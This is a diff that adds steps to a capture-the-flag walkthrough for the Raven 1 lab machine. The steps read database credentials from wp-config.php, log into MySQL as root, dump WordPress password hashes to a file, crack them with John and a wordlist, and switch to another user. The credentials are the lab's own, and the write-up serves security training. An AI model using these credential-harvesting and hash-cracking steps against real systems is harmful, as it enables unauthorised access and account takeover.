@@ -78,4 +78,38 @@
     ![User-flag](./img/raven1_server10.png)  
 
 ## Execution (Second Try)  
-1. 
+1. Investigate the database information  
+    * See the "wp-config.php" file  
+    ![wp-config-php](./img/raven1_server11.png)  
+        - `cd /var/www/html/wordpress`  
+        - `more wp-config.php`  
+        - DB_USER: **root**  
+        - DB_PASSWORD: **R@v3nSecurity**  
+
+1. Access to the MySQL server in the Raven server  
+    * Access to the MySQL  
+    ![SSH-access-root](./img/raven1_server12.png)  
+        - `mysql -h localhost -u root -p`  
+        - Password: **R@v3nSecurity**  
+
+1. Search the Database  
+    * Find the user information and flags  
+    ![users-hash](./img/raven1_server13.png)  
+    ![flag-info](./img/raven1_server14.png)  
+        - `show databases;`  
+        - `use wordpress;`  
+        - `select concat(user_login, ":", user_pass) from wp_users into outfile '/tmp/hash.txt';`  
+        - `select * from wp_posts\G;`  
+
+1. Analyze the hashed passwords  
+    * Analyze the hash from the attacker's server (Because the analysis may place a heavy load)  
+    ![hash-txt](./img/raven1_server15.png)  
+        - `cat > hash.txt`  
+    * Use John  
+    ![]()  
+        - `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`  
+        - Steven's password: **pink84**  
+
+1. Change the user  
+    * Change user from "michael" to "steven" from Raven server  
+        - `su steven`  
